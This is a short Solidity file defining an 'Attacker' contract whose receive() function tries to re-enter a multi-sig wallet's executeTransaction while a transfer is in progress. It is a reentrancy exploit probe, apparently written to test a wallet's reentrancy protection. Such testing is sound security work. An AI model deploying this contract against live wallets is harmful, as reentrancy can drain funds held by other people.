// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

interface IMultiSigWallet {
    function executeTransaction(uint _txId) external;
}

contract Attacker {
    IMultiSigWallet public targetWallet;
    uint public targetTxId;

    constructor(address _wallet) {
        targetWallet = IMultiSigWallet(_wallet);
    }

    function setTxId(uint _txId) external {
        targetTxId = _txId;
    }

    // The malicious payload: tries to re-enter the Multi-Sig during execution
    receive() external payable {
        try targetWallet.executeTransaction(targetTxId) {} catch {}
    }
}